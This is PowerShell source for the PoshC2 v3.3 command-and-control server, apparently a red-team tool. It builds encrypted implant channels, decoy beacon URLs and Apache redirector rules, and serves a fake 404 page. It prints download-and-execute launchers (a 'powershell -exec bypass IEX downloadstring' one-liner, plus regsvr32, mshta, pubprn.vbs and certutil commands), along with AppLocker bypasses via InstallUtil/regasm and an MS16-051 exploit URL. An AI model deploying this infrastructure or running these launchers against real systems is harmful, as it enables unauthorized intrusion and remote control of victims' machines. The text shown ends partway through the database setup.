 # Written by @benpturner and @davehardy20
function C2-Server {
Param($PoshPath, $RestartC2Server)

# are we running with Administrator privileges to open port 80
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
{   
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process -FilePath powershell -Verb runAs -ArgumentList $arguments
    Break
}

Clear-Host
Write-Host -Object "__________            .__.     _________  ________  "  -ForegroundColor Green
Write-Host -Object "\_______  \____  _____|  |__   \_   ___ \ \_____  \ "  -ForegroundColor Green
Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -ForegroundColor Green
Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
Write-Host "=============== v3.3 www.PoshC2.co.uk =============" -ForegroundColor Green
Write-Host "" -ForegroundColor Green

if (!$RestartC2Server) {
    $PathExists = Test-Path $PoshPath

    if (!$PathExists) {
        $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
    }
}

# if poshpath ends with slash then remove this
$p = $env:PsModulePath
$p += ";$PoshPath"
[Environment]::SetEnvironmentVariable("PSModulePath",$p)
Import-Module -Name PSSQLite
$global:newdir = $null
$ipv4address = $null
$randomuriarray = @()
$taskiddb = 1 
$exe = $false

# used to generate random uri for each implant
function Get-RandomURI 
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted bytes block 
function Encrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
function Decrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Decrypt-Bytes($key, $bytes) {
	$IV = $bytes[0..15]
	$aesManaged = Create-AesManagedObject $key $IV
	$decryptor = $aesManaged.CreateDecryptor()
	$byteArray = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
	$input = New-Object System.IO.MemoryStream( , $byteArray ) 
    $output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	$gzipStream.CopyTo( $output )
	$gzipStream.Close()
	$input.Close()
	[byte[]] $byteOutArray = $output.ToArray() 
	$byteOutArray
}
# download file function to convert from base64 in db to file
function Download-File
{
    param
    (
        [string] $SourceFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
    $reader = [System.IO.File]::OpenRead($SourceFilePath)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $base64
    $reader.Dispose()
}

# converts a source base64 file to file (need to change to IO.Memory Reader)
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath
    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize
    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);
     
    $reader.Dispose()
    $writer.Dispose()
}

# for resolving paths for file downloader
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function PatchDll {
    param($dllBytes, $replaceString, $Arch)

    if ($Arch -eq 'x86') {
        $dllOffset = 0x00012D80
        #$dllOffset = 0x00012ED0 +8
    }
    if ($Arch -eq 'x64') {
        $dllOffset = 0x00017100
    }

    # Patch DLL - replace 8000 A's
    $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
    # Length of replacement code
    $dllLength = $replaceString.Length
    $patchLength = 8000 -$dllLength
    $nullString = 0x00*$patchLength
    $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
    $nullBytes = $nullBytes[1..$patchLength]
    $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

    $dllLength = 16000 -2
    $i=0
    # Loop through each byte from start position
    $dllOffset..($dllOffset + $dllLength) | % {
        $dllBytes[$_] = $replaceNewStringBytes[$i]
        $i++
    }
    
    # Return Patched DLL
    return $DllBytes
}

# if the server has been restarted using the Restart-C2Server shortcut
if ($RestartC2Server) 
{
    $global:newdir = $RestartC2Server
    $payload = Get-Content "$global:newdir\payloads\payload.bat"
    Write-Host -Object "Using existing database and payloads: $global:newdir"
    $Database = "$global:newdir\PowershellC2.SQLite"
    $taskscompleted = Invoke-SqliteQuery -DataSource $Database -Query "SELECT CompletedTaskID FROM CompletedTasks" -As SingleValue

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $EncKey = $c2serverresults.EncKey
    $ipv4address = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $serverport = $c2serverresults.ServerPort 
    $shortcut = $c2serverresults.QuickCommand
    $downloaduri = $c2serverresults.DownloadURI
    $httpresponse = $c2serverresults.HTTPResponse
    $enablesound = $c2serverresults.Sounds
    $apikey = $c2serverresults.APIKEY
    $mobilenumber = $c2serverresults.MobileNumber
    $urlstring = $c2serverresults.URLS
    $Socksurlstring = $c2serverresults.SocksURLS
    $Insecure = $c2serverresults.Insecure
    $useragent = $c2serverresults.UserAgent

    $downloadStub = $urlstring -split ","
    $downloadStubURL = $downloadStub[1] -replace '"',''
    $newImplant = $urlstring -split ","
    $newImplantURL = $newImplant[0] -replace '"',''
    $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"

    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"

    write-host $shortcut `n -ForegroundColor green
    write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
    write-host ""
    write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
    write-host ""
    write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""
    write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
    write-host ""

    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"

    foreach ($task in $taskscompleted) {
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
    $ranuri = $resultsdb.RandomURI
    $implantResults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
    $implanthost = $implantResults.User
    $impHost = $implantResults.Hostname
    $impID = $implantResults.ImplantID
    $impDom = $implantResults.Domain

    if ($resultsdb)
    {
        if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
        if ($resultsdb.Command.tolower().startswith('$shellcode')) {}
        elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
        else 
        {
            $Tasktime = $resultsdb.TaskID
            Write-Host "Command issued against implant $impID on host $impHost $impDom ($TaskTime)" -ForegroundColor Yellow
            Write-Host -Object $resultsdb.Command -ForegroundColor Green
            Write-Host -Object $resultsdb.Output -ForegroundColor Green
        }
        $taskiddb ++
    }
    }
    $newcount = $taskscompleted.Count
    $taskiddb = $newcount+1
    write-host "$newcount tasks completed before resuming the C2 server"
}
else 
{
    # determine if there are multiple network adaptors
    $localipfull = Get-WmiObject -Query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" |
    Select-Object -ExpandProperty IPAddress | 
    Where-Object -FilterScript {([Net.IPAddress]$_).AddressFamily -eq 'InterNetwork'}
    if ($localipfull)
    {
        Write-Output -InputObject "IP found: $localipfull"
        write-host ""
        $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
        $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
    }
    $uri="http://"
    $prompthttpsdef = "Yes"
    $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS for implant comms? [Yes]"
    $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
    if ($prompthttps -eq "Yes") {
    $uri="https://"
    $ipv4address = "https://"+$ipv4address
    $promptssldefault = "Yes"

    #detect if powershell < v4
    $psver = $PSVersionTable.psversion.Major
    if ($psver -lt '4') {
        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use default and permit self-signed SSL certificates [Yes]"
        $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
        if ($promptssl -eq "Yes") {
            $Insecure = "YES"
            CERTUTIL -f -p poshc2 -importpfx "$PoshPath\poshc2.pfx" 
            $thumb = "DE5ADA225693F8E0ED43453F3EB512CE96991747"
            $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
            $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
            if ($Added = "SSL Certificate successfully added") {
                $cert = netsh.exe http show sslcert ipport=0.0.0.0:443
            }
        } else {
            $Insecure = "No"
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
    } else {
    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use default and permit self-signed SSL certificates [Yes]"
    $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
    if ($promptssl -eq "Yes") {
        $Insecure = "YES"
        $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
        $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
        $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
        if ($Added = "SSL Certificate successfully added") {
            $cert = netsh.exe http show sslcert ipport=0.0.0.0:443
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
} else {
                $Insecure = "NO"
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}

}

    $promptdomfrontdef = "No"
    $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting? [No]"
    $promptdomfront = ($promptdomfrontdef,$promptdomfront)[[bool]$promptdomfront]
    if ($promptdomfront -eq "Yes") {
        $promptdomfront = Read-Host -Prompt "[2c] Please specify the host header for domain fronting?"
        if ($promptdomfront) {
            $domainfrontheader = $promptdomfront
        }
    }

    $defaultserverport = 443
    } else {
    $ipv4address = "http://"+$ipv4address
        $defaultserverport = 80
    }
    
    $apache = @"
RewriteEngine On
SSLProxyEngine On
SSLProxyCheckPeerCN Off
SSLProxyVerify none
SSLProxyCheckPeerName off
SSLProxyCheckPeerExpire off

Define PoshC2 <ADD_IPADDRESS_HERE>
Define SharpSocks <ADD_IPADDRESS_HERE>

RewriteRule ^/webapp/static(.*) $uri`${PoshC2}/webapp/static`$1 [NC,L,P]
RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,L,P]
"@
    $customurldef = "No"
    $customurl = Read-Host -Prompt "[3a] Do you want to customize the beacon URLs from the default? [No]"
    $customurl = ($customurldef,$customurl)[[bool]$customurl]
    if ($customurl -eq "Yes") {
        $urls = @()
        do {
            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${PoshC2}/$input`$1 [NC,L,P]"}
        }
        until ($input -eq '')
        [string]$urlstring = $null
        $urlstring = $urls -join ","
    } else {
        $urlstring = '"images/static/content/","news/","webapp/static/","images/prints/","wordpress/site/","steam/connect/","true/images/static/","holdings/office/images/","preferences/site/","okfn/website/blob/master/templates/","forums/review/","general/community/mega/","organisations/space/value/","trigger/may/","web/master/review/","premium/gov/pop/","usc/builder/power/master/","shopping/v/awe/pool/app/a/","pl/en/pages/","store/en/uk/pages/","plugins/domains/custom/uk/","gas/safe/register/","online/free/advice/","cookies/websites/content/","free/uk/shopping/unlimited/"'
            $apache = @"
RewriteEngine On
SSLProxyEngine On
SSLProxyCheckPeerCN Off
SSLProxyVerify none
SSLProxyCheckPeerName off
SSLProxyCheckPeerExpire off

Define PoshC2 <ADD_IPADDRESS_HERE>
Define SharpSocks <ADD_IPADDRESS_HERE>

RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,L,P]
RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,L,P]
RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,L,P]
RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,L,P]
RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,L,P]
RewriteRule ^/wordpress/site/(.*) $uri`${PoshC2}/wordpress/site/`$1 [NC,L,P]
RewriteRule ^/true/images/(.*) $uri`${PoshC2}/true/images/`$1 [NC,L,P]
RewriteRule ^/holdings/office/images/(.*) $uri`${PoshC2}/holdings/office/images/`$1 [NC,L,P]
RewriteRule ^/steam/connect/(.*) $uri`${PoshC2}/steam/connect/`$1 [NC,L,P]
RewriteRule ^/preferences/site/(.*) $uri`${PoshC2}/preferences/site/`$1 [NC,L,P]
RewriteRule ^/okfn/website/blob/master/templates/(.*) $uri`${PoshC2}/okfn/website/blob/master/templates/`$1 [NC,L,P]
RewriteRule ^/forums/review/(.*) $uri`${PoshC2}/forums/review/`$1 [NC,L,P]
RewriteRule ^/general/community/mega/(.*) $uri`${PoshC2}/general/community/mega/`$1 [NC,L,P]
RewriteRule ^/organisations/space/value/(.*) $uri`${PoshC2}/organisations/space/value/`$1 [NC,L,P]
RewriteRule ^/trigger/may/(.*) $uri`${PoshC2}/trigger/may/`$1 [NC,L,P]
RewriteRule ^/web/master/review/(.*) $uri`${PoshC2}/web/master/review/`$1 [NC,L,P]
RewriteRule ^/premium/gov/pop/(.*) $uri`${PoshC2}/premium/gov/pop/`$1 [NC,L,P]
RewriteRule ^/usc/builder/power/master/(.*) $uri`${PoshC2}/usc/builder/power/master/`$1 [NC,L,P]
RewriteRule ^/shopping/v/awe/pool/app/a/(.*) $uri`${PoshC2}/shopping/v/awe/pool/app/a/`$1 [NC,L,P]
RewriteRule ^/pl/en/pages/(.*) $uri`${PoshC2}/pl/en/pages/`$1 [NC,L,P]
RewriteRule ^/store/en/uk/pages/(.*) $uri`${PoshC2}/store/en/uk/pages/`$1 [NC,L,P]
RewriteRule ^/plugins/domains/custom/uk/(.*) $uri`${PoshC2}/plugins/domains/custom/uk/`$1 [NC,L,P]
RewriteRule ^/gas/safe/register/(.*) $uri`${PoshC2}/gas/safe/register/`$1 [NC,L,P]
RewriteRule ^/online/free/advice/(.*) $uri`${PoshC2}/online/free/advice/`$1 [NC,L,P]
RewriteRule ^/cookies/websites/content/(.*) $uri`${PoshC2}/cookies/websites/content/`$1 [NC,L,P]
RewriteRule ^/free/uk/shopping/unlimited/(.*) $uri`${PoshC2}/free/uk/shopping/unlimited/`$1 [NC,L,P]
"@
    }

    $customurldef = "No"
    $customurl = Read-Host -Prompt "[3b] Do you want to customize the beacon URLs from the Socks Proxy (SharpSocks)? [No]"
    $customurl = ($customurldef,$customurl)[[bool]$customurl]
    if ($customurl -eq "Yes") {
        $urls = @()
        do {
            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${SharpSocks}/$input`$1 [NC,P]"}
        }
        until ($input -eq '')
        [string]$socksurlstring = $null
        $socksurlstring = $urls -join ","
    } else {
        $socksurlstring = '"sitemap/api/push","visitors/upload/map","printing/images/bin/logo","update/latest/traffic","saml/stats/update/push"'
        $apache += @"

RewriteRule ^/sitemap/api/push(.*) $uri`${SharpSocks}/sitemap/api/push`$1 [NC,L,P]
RewriteRule ^/visitors/upload/map(.*) $uri`${SharpSocks}/visitors/upload/map`$1 [NC,L,P]
RewriteRule ^/printing/images/bin/logo(.*) $uri`${SharpSocks}/printing/images/bin/logo`$1 [NC,L,P]
RewriteRule ^/update/latest/traffic(.*) $uri`${SharpSocks}/update/latest/traffic`$1 [NC,L,P]
RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/push`$1 [NC,L,P]
"@
    }

    $customuseragentdef = "No"
    $customuseragent = Read-Host -Prompt "[4] Do you want to customize the default UserAgent? [No]"
    $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]

    if ($customuseragent -eq "Yes") {
        $useragent = (Read-Host "Please enter the UserAgent you want to use: ")
    } else {
        $useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
    }

    $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
    $prompt = Read-Host -Prompt "[5] Enter a new folder name for this project [$($global:newdir)]"
    $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
    $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
    $global:newdir = $RootFolder+"\"+$tempdir

    $defbeacontime = "5s"
    $prompt = Read-Host -Prompt "[6] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
    $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
    if ($defaultbeacon.ToLower().Contains('m')) { 
        $defaultbeacon = $defaultbeacon -replace 'm', ''
        [int]$newsleep = $defaultbeacon 
        [int]$defaultbeacon = $newsleep * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('h')) { 
        $defaultbeacon = $defaultbeacon -replace 'h', ''
        [int]$newsleep1 = $defaultbeacon 
        [int]$newsleep2 = $newsleep1 * 60
        [int]$defaultbeacon = $newsleep2 * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('s')) { 
        $defaultbeacon = $defaultbeacon -replace 's', ''
    } else {
        $defaultbeacon = $defaultbeacon
    }
    
    $killdatedefault = (get-date).AddDays(14)
    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
    $prompt = Read-Host -Prompt "[7] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
    $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
    $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
    $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"

    $prompt = Read-Host -Prompt "[8] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
    $serverport = ($defaultserverport,$prompt)[[bool]$prompt]

    $enablesound = "Yes"
    $prompt = Read-Host -Prompt "[9] Do you want to enable sound? [$($enablesound)]"
    $enablesound = ($enablesound,$prompt)[[bool]$prompt]

    $enablesms = "No"
    $prompt = Read-Host -Prompt "[10] Do you want to use Clockwork SMS for new payloads? [$($enablesms)]"
    $enablesms = ($enablesms,$prompt)[[bool]$prompt]
    if ($enablesms -eq "Yes") {
        $apikey = Read-Host -Prompt "[10a] Enter Clockwork SMS API Key?"
        $MobileNumber = Read-Host -Prompt "[10b] Enter Mobile Number to send to? [447898....]"
    }

    $enablepayloads = "Yes"
    $prompt = Read-Host -Prompt "[11] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
    $enablepayloads = ($enablepayloads,$prompt)[[bool]$prompt]
    $downloadStub = $urlstring -split ","
    $downloadStubURL = $downloadStub[1] -replace '"',''
    $newImplant = $urlstring -split ","
    $newImplantURL = $newImplant[0] -replace '"',''

    $downloaduri = Get-RandomURI -Length 5
    if ($ipv4address.Contains("https")) {
        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+"" 
    } else {
        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+""     
    }

    $httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
    '

    $EncKey = Create-AesKey

    New-Item $global:newdir -Type directory | Out-Null
    New-Item $global:newdir\downloads -Type directory | Out-Null
    New-Item $global:newdir\reports -Type directory | Out-Null
    New-Item $global:newdir\payloads -Type directory | Out-Null
    $Database = "$global:newdir\PowershellC2.SQLite"

    $Query = 'CREATE TABLE Implants (
        ImplantID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI VARCHAR(20),
        User TEXT,
        Hostname TEXT,
        IpAddress TEXT,
        Key TEXT,
        FirstSeen TEXT,
        LastSeen TEXT,
        PID TEXT,
        Proxy TEXT,
        Arch TEXT,
        Domain TEXT,
        Alive TEXT,
        Sleep TEXT,
        ModsLoaded TEXT,
        Pivot TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

	$Query = 'CREATE TABLE AutoRuns (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Task TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE CompletedTasks (
        CompletedTaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        TaskID TEXT,
        RandomURI TEXT,
        Command TEXT,
        Output TEXT,
        Prompt TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE NewTasks (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI TEXT,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

